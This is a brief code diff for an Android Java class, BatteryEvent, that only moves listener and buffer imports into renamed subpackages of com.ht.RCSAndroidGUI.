@@ -4,12 +4,12 @@ import java.io.IOException;
 
 import android.util.Log;
 
-import com.ht.RCSAndroidGUI.AcListener;
 import com.ht.RCSAndroidGUI.Battery;
-import com.ht.RCSAndroidGUI.BatteryListener;
 import com.ht.RCSAndroidGUI.Status;
 import com.ht.RCSAndroidGUI.interfaces.Observer;
-import com.ht.RCSAndroidGUI.utils.DataBuffer;
+import com.ht.RCSAndroidGUI.listener.AcListener;
+import com.ht.RCSAndroidGUI.listener.BatteryListener;
+import com.ht.RCSAndroidGUI.util.DataBuffer;
 
 public class BatteryEvent extends EventBase implements Observer<Battery> {
 	/** The Constant TAG. */
